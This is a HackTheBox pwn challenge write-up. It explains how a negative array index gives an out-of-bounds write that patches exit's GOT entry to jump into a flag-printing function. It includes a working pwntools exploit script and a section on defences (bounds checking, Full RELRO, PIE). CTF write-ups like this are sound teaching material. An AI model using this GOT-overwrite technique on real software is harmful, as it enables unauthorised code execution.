---
layout: post
title: "HackTheBox Challenge: Great Old Talisman"
date: 2027-09-09 09:00:00 -0500
categories: [HackTheBox, Challenges]
tags: [hackthebox, challenge, pwn, oob-write, got-overwrite, partial-relro, no-pie, pwntools]
---

## Overview

**Great Old Talisman** is an Easy HackTheBox **Pwn** challenge. The binary lets you pick *which slot* of a global array to write into, then writes your bytes there — but it never checks that the slot is actually inside the array. The whole challenge is one question: **what happens when you point the write at the GOT instead of the array?**

The answer is a textbook [out-of-bounds write](https://cwe.mitre.org/data/definitions/787.html) ([CWE-787](https://cwe.mitre.org/data/definitions/787.html)) using a negative index, turned into a 2-byte GOT overwrite that redirects `exit()` into an unused flag-printing function — no memory leak, no ROP chain, no shellcode.

## The technique

`main()` reduces to this:

```c
long talis[3];                 // global array at 0x4040a0
int  idx;
scanf("%d", &idx);             // YOU choose the index
read(0, &talis[idx], 2);       // YOU write 2 bytes there
exit(0x520);                   // program ends
```

There is also an **unused** function the program never calls on purpose:

```c
void read_flag() {             // at 0x40135a
    int fd = open("./flag.txt", 0);
    // ... prints the file byte by byte ...
}
```

Two weaknesses line up:

1. **No bounds check.** `idx` is a signed `int`, never validated. A *negative* index makes `&talis[idx]` point to memory **before** the array.
2. **The protections don't apply.** `checksec` shows a stack canary and NX — but those only stop *stack* overflows, and we never touch the stack. The binary is also **No PIE** (every address is fixed) with **Partial RELRO** (the GOT is writable).

Just below the array sits the **GOT**. `exit`'s slot is at `0x404080`, the array starts at `0x4040a0`, each entry is 8 bytes:

```
idx = (exit@GOT - talis) / 8 = (0x404080 - 0x4040a0) / 8 = -4
```

An index of `-4` lands the `read()` straight on `exit`'s GOT entry. We only get to write **2 bytes**, but that's all we need: before `exit` is first called its GOT slot still points into the binary's own code (`0x00000000004011xx`), and `read_flag` is at `0x000000000040135a` — only the low two bytes differ. Overwrite them with `0x135a` and the trailing `exit(0x520)` jumps into `read_flag()`.

```
exit@GOT:  00 00 00 00 00 40 11 xx   →   00 00 00 00 00 40 13 5a
                                  ^^^^^               ^^^^^
                          write p16(0x135a) (little-endian: 5a 13)
```

## Solution

Recon the three addresses — `objdump -R` for the GOT slot, `readelf -s` for the array, the disassembly for the win function — then fire a single OOB write.

Create `solve.py`:

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

TALIS     = 0x4040a0    # readelf -s : the global array
EXIT_GOT  = 0x404080    # objdump -R : GOT slot for exit
READ_FLAG = 0x40135a    # disasm    : the unused win function
IDX = (EXIT_GOT - TALIS) // 8          # = -4

io = remote('TARGET', PORT)
io.recvuntil(b'(1 -> Yes, 0 -> No)')   # the "enchant?" prompt
io.sendline(str(IDX).encode())          # scanf("%d") -> OOB index -4
io.send(p16(READ_FLAG & 0xffff))        # read(...,2): patch low 2 bytes of exit@GOT
print(io.recvall(timeout=5).decode(errors='replace'))   # read_flag() prints it
```

Run it against the live instance:

```bash
python3 solve.py <host> <port>
```

The binary prints the flag: `HTB{...}` (redacted).

## Why it worked

| Step | Why |
|------|-----|
| Send `-4` | No bounds check on the index → reach memory before the array |
| Land on `exit@GOT` | The GOT sits just below the array; `-4 * 8 = -32` bytes = exactly the `exit` slot |
| Write 2 bytes | Only the low 2 bytes of the address differ between the stub and `read_flag` |
| `exit()` fires the win | The patched GOT slot is dereferenced the next time `exit` is called |

The canary and NX are completely sidestepped because there is no stack corruption at all — the entire exploit is one relative 2-byte write into a writable function-pointer table, made possible by an unbounded array index on a binary with static addresses.

## Fix / defense

Bounds-check the index before computing the address:

```c
size_t idx;
if (scanf("%zu", &idx) != 1 || idx >= 3) { puts("bad index"); return 1; }
read(0, &talis[idx], 2);
```

And harden the binary: link with **Full RELRO** (`-Wl,-z,relro,-z,now`) so the GOT is read-only after startup, and compile **PIE** (`-fPIE -pie`) so the GOT slots and the win-function address aren't predictable. Any one of bounds-checking, a read-only GOT, or PIE would have killed this exploit on its own.
